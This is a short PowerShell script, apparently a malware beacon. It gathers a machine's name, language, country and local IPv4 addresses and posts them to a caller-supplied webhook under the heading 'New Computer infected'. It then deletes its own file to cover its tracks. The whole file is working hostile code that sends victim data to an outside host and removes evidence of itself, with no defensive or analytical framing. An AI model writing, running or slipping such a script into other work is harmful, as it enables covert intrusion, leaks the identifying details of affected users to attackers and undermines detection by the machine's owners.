param([string] $Webhook)

try { 
    $ipEthernet = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress 
} catch { 
    $ipEthernet = 'No Ethernet'
} 
try { 
    $ipWlan = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Wlan*).IPAddress
} 
catch { 
    $ipWlan = 'No Wlan' 
} 
$language = (Get-WinUserLanguageList)[0].autonym
$country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
$country = $country.Substring(0, $country.length - 2)
$description = 
"
New Computer infected 
---------------------------------
Computer Name = $env:computername 
Computer Language = $language
Location (country) = $country
Ethernet IP = $ipEthernet
WLan IP = $ipWlan
"
$payload = [PSCustomObject]@{content=$description}
Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
Remove-Item $PSCommandPath -Force 